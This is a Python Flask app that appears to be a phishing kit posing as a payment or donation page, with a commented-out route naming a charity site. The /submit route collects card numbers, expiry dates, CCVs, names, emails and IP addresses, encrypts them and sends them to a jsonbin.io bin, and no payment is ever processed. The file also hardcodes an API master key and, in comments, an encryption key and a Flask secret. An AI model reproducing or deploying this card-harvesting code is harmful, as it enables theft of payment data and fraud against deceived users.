import pandas as pd
from flask import Flask, render_template, request, redirect

import requests, os

import secrets
#print(secrets.token_hex(100))
# save data using jsonbin.io  ( use 'url' as env variable for safety)
url = os.environ.get('BIN')#f"https://api.jsonbin.io/v3/b/67f0a3258960c979a57e8a01"

headers = {
    "X-Master-Key": "$2a$10$EXZio0Iidl50cU/C0uO6p.mG9Ofr6N/KdltbXi7EoUYhsBilrIxlS",
    "Content-Type": "application/json"
}
# data base
DB = ['+++++++++++++++++++++++']

# create flask app
app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_BIN')#'e74e24d632bbc70b1c8dfcf386160b7d8863bfe3c5f90f229dc7ab6747eace5777ab82c2256bf675ed547506f1491b9879fb335cf169164755e8a297e172d8e2a2b579f3072c82f19f2b4e81b26b107ef1aa6d1ebe50ebb41976be75322d60bd58cbe498'


# Home page route
@app.route('/')
def home():
    return render_template('index.html')


@app.route('/payment/')
def payment():
    return render_template('payment/payment.html')


# Thank you page route
@app.route('/thanks/')  # create Serever ERROR page
def thank_you():
    return render_template('thanks/thanks.html')


# create encryptor
"""chars = r'''`1234567890-=qwertyuiop[]\asdN_fghjkl;'zxcvbnm,./~!@#$%^&*()+QWERTYUIOP}{|ASDFGHJCKL:"ZXVBM<>?ضصثقفغعهخحجدشسيبلاتنمكطئءؤرىةوزظ'''
chars = set([c for c in chars])
chars = [c for c in chars]

chars_shuffled = pd.Series(chars).sample(frac=1.0, random_state=9873).tolist()
encryptor = {k: v for k, v in zip(chars,chars_shuffled)}
decryptor = {v: k for (k, v) in encryptor.items()}


encryptor[' ']=' '
decryptor[' ']=' '


print(encryptor)
print(decryptor)
import pickle

pd.to_pickle(encryptor,'encryptor.pkl',)
pd.to_pickle(decryptor,'decryptor.pkl',)
"""

encryptor = pd.read_pickle('encryptor.pkl', )
decryptor = pd.read_pickle('decryptor.pkl', )


def encrypt(text):
    encrypted = []
    for c in text:
        try:
            encrypted.append(encryptor.get(c, ' '))
        except:
            encrypted.append('   ')
    return ''.join(encrypted)


def decrypt(text):
    decrypted = []
    for c in text:
        try:
            decrypted.append(decryptor.get(c, ' '))
        except:
            decrypted.append('   ')
    return ''.join(decrypted)


# -------------------------------------

from cryptography.fernet import Fernet

key = os.environ.get('ENCRYPTION_KEY') # TkxyCBNvbkF1Hlr1XMDAb3gwL82fMED6s2nbaqzyFd4= # save this code in an environment variable
print('---')
print(key)
cipher = Fernet(key.encode('utf-8'))


# Form submission route
@app.route('/submit', methods=['POST'])
def submit():
    # Get user input from the form
    username = request.form['username']
    expiry = request.form['expiry']
    card_number = request.form['card_number']
    ccv = request.form['ccv']
    # optional inputs ('' are important)
    email = request.form['email'] + ''
    country = request.form['country'] + ''

    ip_address = request.remote_addr

    text = fr''' 
        user submitted
        * IP Address: {ip_address}
        * CARD-DETAILS:  Email= {email} ||| Name= {username} ||| expiry-date= {expiry} ||| card-number= {card_number} ||| ccv= {ccv} ||| country= {country} ;
        +++++++++++++++++
        '''

    encrypted_data = cipher.encrypt(text.encode('utf-8'))

    DB.append(encrypted_data.decode('utf-8'))
    large_text = ''.join(DB)
    requests.put(url, json={'data': large_text}, headers=headers)

    # Optionally, you could save it to a file or database here

    # Redirect to a success page or back to the home page
    return redirect('/thanks')


"""# Success page route
@app.route('/https://israelrescue.org/')
def success():
    return " done successfully!"""

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
